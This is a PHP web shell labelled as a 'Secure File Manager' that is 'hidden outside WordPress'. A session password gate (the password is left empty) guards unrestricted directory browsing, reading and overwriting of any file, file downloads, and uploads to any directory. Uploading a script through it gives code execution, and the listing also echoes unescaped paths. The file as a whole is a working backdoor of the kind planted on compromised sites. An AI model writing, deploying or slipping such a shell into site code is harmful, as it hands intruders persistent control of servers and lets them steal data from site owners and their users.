<?php
// 🛡️ Secure File Manager - Hidden outside WordPress
session_start();
$password = '';

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        echo '<form method="post"><input name="pass" type="password"/><input type="submit"/></form>';
        exit;
    }
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        echo "✅ Saved!";
    }
    echo '<form method="POST"><textarea name="content" style="width:100%;height:400px">'.htmlspecialchars(file_get_contents($file)).'</textarea><br><input type="submit" value="Save"/></form>';
    exit;
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Type: application/octet-stream');
    readfile($file);
    exit;
}

if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $dir . '/' . $_FILES['file']['name']);
    echo "✅ Uploaded!";
}

echo "<h3>📂 Directory: $dir</h3>";
echo '<form method="POST" enctype="multipart/form-data"><input type="file" name="file"/><input type="submit" value="Upload"/></form><br>';

$files = scandir($dir);
foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = $dir . '/' . $f;
    echo (is_dir($path) ? "[DIR] " : "[FILE] ");
    echo "<a href='?dir=" . urlencode($path) . "'>$f</a> ";
    if (is_file($path)) {
        echo "[<a href='?edit=" . urlencode($path) . "'>Edit</a>] ";
        echo "[<a href='?download=" . urlencode($path) . "'>Download</a>]";
    }
    echo "<br>";
}
?>
